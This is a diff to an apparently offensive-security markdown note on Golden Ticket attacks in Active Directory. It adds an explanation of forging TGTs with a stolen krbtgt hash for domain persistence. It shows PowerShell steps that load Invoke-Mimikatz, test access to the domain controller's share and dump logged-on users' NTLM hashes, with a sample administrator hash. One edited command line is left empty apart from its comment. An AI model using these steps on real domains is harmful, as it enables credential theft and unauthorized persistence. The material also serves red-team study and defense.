@@ -9,6 +9,8 @@ tags:
   - active
 ---
  
+When the user performs a logon authentication, a TGT is created by the domain controller and is encrypted with the _krbtgt_ account password hash. If we compromise the krbtgt password hash (through DCSync for example), we can create TGT tickets and encrypt them with our compromised hash. Its a way of gaining persistence in the domain.
+
 Generate a TGT, escalate privileges and obtain DC access.
 
 > [!Requirements]
@@ -21,7 +23,7 @@ PS> . .\Invoke-Mimikatz.ps1
 
 + EXTRACT ADMIN NTLM HASH +
 PS> dir \\DC_FQDN/c$ (verify if we can access the DC -> we shouldnt)
-PS> Invoke-Mimkatz -Command '"privilege::debug" "sekurlsa::logonpasswords"' (extract the NTLM hash of the users that are loged in)
+PS>  (extract the NTLM hash of the users that are loged in)
 *copy the NTLM hash for the user administrator*
 84398159ce4d01cfe10cf34d5dae3909
 ```
